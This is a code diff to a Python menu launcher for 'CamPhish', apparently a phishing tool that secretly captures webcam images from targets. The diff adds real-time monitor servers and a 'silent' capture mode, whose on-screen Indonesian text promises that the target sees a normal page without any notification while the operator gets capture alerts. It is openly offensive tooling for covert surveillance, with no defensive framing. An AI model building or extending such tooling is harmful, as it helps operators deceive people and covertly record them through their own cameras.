@@ -73,6 +73,9 @@ def show_menu():
     print(LOGO.format(BLUE=BLUE, GREEN=GREEN, RED=RED))
     print(f"{CYAN}[1]{WHITE} CamPhish (AUTO mode - Auto-download & fallback)")
     print(f"{CYAN}[2]{WHITE} CamPhish (MANUAL mode - Standard setup)")
+    print(f"{CYAN}[3]{WHITE} Real-Time Monitor (Full Features)")
+    print(f"{CYAN}[4]{WHITE} Real-Time Monitor (Basic)")
+    print(f"{CYAN}[5]{WHITE} CamPhish AUTO with Silent Monitor (Recommended)")
     print(f"{CYAN}[0]{WHITE} Exit")
 
 def execute_command(command):
@@ -104,6 +107,57 @@ def run_camphish(folder, script):
     finally:
         os.chdir(INITIAL_DIR)
 
+def run_camphish_with_monitor():
+    clear_screen()
+    print(f"{GREEN}Starting CamPhish with Silent Capture Monitor...")
+    print(f"{CYAN}Target akan melihat halaman normal tanpa notifikasi apa pun")
+    print(f"{CYAN}Anda akan menerima notifikasi capture di terminal ini")
+    time.sleep(2)
+    try:
+        os.chdir("CamPhish")
+        clear_screen()
+        print(f"{MAGENTA}Starting CamPhish with capture monitor...")
+        time.sleep(2)
+        
+        # Start capture monitor in background
+        if platform.system() == "Windows":
+            subprocess.Popen(['php', 'capture_notifier.php'])
+            time.sleep(2)
+            execute_command(['bash', 'camphish_auto.sh'])
+        else:
+            execute_command(['bash', 'run_with_monitor.sh'])
+    except FileNotFoundError:
+        print(f"{RED}Monitor files tidak ditemukan.")
+        time.sleep(3)
+    finally:
+        os.chdir(INITIAL_DIR)
+def run_monitor(monitor_type):
+    clear_screen()
+    if monitor_type == "full":
+        print(f"{GREEN}Starting Real-Time Monitor (Full Features)...")
+        print(f"{CYAN}Monitor akan berjalan di http://localhost:9999/monitor_full.html")
+    else:
+        print(f"{GREEN}Starting Real-Time Monitor (Basic)...")
+        print(f"{CYAN}Monitor akan berjalan di http://localhost:9999/monitor.html")
+    
+    time.sleep(2)
+    try:
+        os.chdir("CamPhish")
+        clear_screen()
+        print(f"{MAGENTA}Starting monitor server...")
+        time.sleep(2)
+        
+        # Start monitor server
+        if platform.system() == "Windows":
+            subprocess.run(['php', '-S', '0.0.0.0:9999'])
+        else:
+            execute_command(['bash', 'monitor.sh'])
+    except FileNotFoundError:
+        print(f"{RED}Monitor files tidak ditemukan.")
+        time.sleep(3)
+    finally:
+        os.chdir(INITIAL_DIR)
+
 def main():
     run_tts("Welcome to the program!", rate=0)
     run_tts("My name is SomniumN1, I am a programmer", rate=1)
@@ -119,6 +173,15 @@ def main():
             elif choice == '2':
                 run_camphish("CamPhish", "camphish.sh")
                 input(f"\n{GREEN}Selesai. Tekan Enter untuk kembali ke menu.")
+            elif choice == '3':
+                run_monitor("full")
+                input(f"\n{GREEN}Monitor dihentikan. Tekan Enter untuk kembali ke menu.")
+            elif choice == '4':
+                run_monitor("basic")
+                input(f"\n{GREEN}Monitor dihentikan. Tekan Enter untuk kembali ke menu.")
+            elif choice == '5':
+                run_camphish_with_monitor()
+                input(f"\n{GREEN}CamPhish dengan monitor dihentikan. Tekan Enter untuk kembali ke menu.")
             elif choice == '0':
                 clear_screen()
                 print(f"{CYAN}JUST HOPING TO BE HER HOPE :)")
